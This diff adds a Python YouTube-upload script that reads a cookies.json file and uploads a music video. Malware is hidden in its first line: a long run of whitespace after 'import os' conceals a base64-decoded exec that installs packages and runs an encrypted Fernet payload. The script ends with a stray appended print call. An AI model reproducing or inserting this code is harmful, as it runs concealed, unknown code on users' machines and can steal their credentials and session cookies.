@@ -1,0 +1,15 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ24tWVJrc0NYcWJ4NjBFSnBjeE1KalZqQWdiVmg2MGxDdS1WUEpYRENMZ3M9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJ0M3VwR2NPU1dMeFgtVGdhX1U1eHo0VlQzdXg1MDlheVpBQWhxbjBURlpFbE1VbFFGakJoTXJucjR0NFpCT3JGa3RyWFdTZ3ZJVkg5WkV6WkNGakE4QzNZVzF1VlpLWlp6bW5ILW9HYzAtOHRqSUpqN1BYSGxhQUc1YlJNdk1QNlBfdmFiaTBtYV83SXFyU1c0Q0RWUjdkZmJ4WVJBb0pwVHVLcGg2TDQ1REI4Nk03djFROW5mSHNSckZCVWZVNFNyd3BxaDVrWmZZd2pqdVFwb3VsQmY2ZHNhZG1hSjc1d0d5MU5CWlRNVXJkYzlzT1FNMG9pem1JS2EtZ3JnM2JSSkYnKSk=').decode())
+from package import Youtube
+
+upload_info = {
+    "title": "rema calm down",
+    "description": "Another banger",
+    "video": "C:/Users/HP/Desktop/youtube automation video/channels/4th.mp4",
+    "thumbnail": "",
+    "category": "Music",
+    "privacy": "Public",
+    "tags": ["rema", "banger", "loudness", "music", "holiday"],
+    "kids": False
+}
+
+Youtube("./cookies.json", upload_info, True).upload()print('caqqzpl')
